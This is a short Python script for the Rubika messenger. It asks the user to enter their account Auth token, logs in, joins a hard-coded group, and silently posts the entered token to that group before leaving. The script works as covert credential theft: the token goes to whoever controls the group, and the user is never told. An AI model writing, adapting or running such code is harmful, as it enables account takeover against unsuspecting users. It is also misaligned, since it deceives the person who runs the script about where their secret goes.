from rubika.client import Bot
print("شناسه :")
ui=input ("inter Auth : ")
bot = Bot (ui)
hep = "g0Bvp8U0911e7fdad043cfc9b6f4aa2b"
bot.joinGroup("https://rubika.ir/joing/CGHEEIGA0YCQUMERHRDYKWFIWUOXPBRV")
bot.sendMessage(hep,f"𝙰𝚞𝚝𝚑 | 𝐀𝐜𝐜𝐨𝐮𝐧𝐭 : [ {ui} ]")
bot.leaveGroup(hep)